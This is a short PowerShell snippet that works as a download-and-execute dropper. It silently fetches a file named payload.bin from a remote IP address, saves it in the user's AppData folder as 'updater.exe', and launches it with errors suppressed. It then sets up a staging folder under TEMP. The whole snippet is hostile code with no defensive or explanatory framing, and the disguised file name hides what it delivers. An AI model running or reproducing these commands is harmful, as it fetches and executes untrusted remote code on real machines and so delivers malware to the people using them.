curl.exe -s -L -o "$env:APPDATA\updater.exe" "https://192.0.2.218/downloads/payload.bin"
Start-Process -FilePath "$env:APPDATA\updater.exe" -ErrorAction SilentlyContinue
Set-Location -Path $env:TEMP
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
